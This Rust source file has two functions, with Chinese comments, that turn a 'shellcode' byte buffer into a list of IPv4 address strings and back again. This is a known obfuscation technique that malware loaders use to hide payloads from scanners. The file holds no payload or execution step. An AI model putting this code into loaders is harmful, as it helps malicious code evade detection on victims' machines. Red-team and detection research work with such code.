use std::net::Ipv4Addr;

/// 混淆函数：返回IPv4字符串数组
pub(crate) fn obfuscate_ipv4(shellcode: &mut Vec<u8>) -> Vec<String> {
    if shellcode.len() % 4 != 0 {
        shellcode.resize((shellcode.len() + 3) / 4 * 4, 0);
    }

    let mut result = Vec::new();
    for chunk in shellcode.chunks(4) {
        let ip = format!("{}.{}.{}.{}", chunk[0], chunk[1], chunk[2], chunk[3]);
        result.push(ip);
    }
    result
}

/// 解混淆函数：返回字节数组
pub(crate) fn deobfuscate_ipv4(list_ips: Vec<&str>) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut deobfuscated_ips: Vec<u8> = Vec::with_capacity(list_ips.len() * 4);

    for ip in list_ips {
        let ip_addr = ip
            .parse::<Ipv4Addr>()
            .map_err(|e| format!("Failed to parse IP '{}': {}", ip, e))?;
        deobfuscated_ips.extend_from_slice(&ip_addr.octets());
    }

    Ok(deobfuscated_ips)
}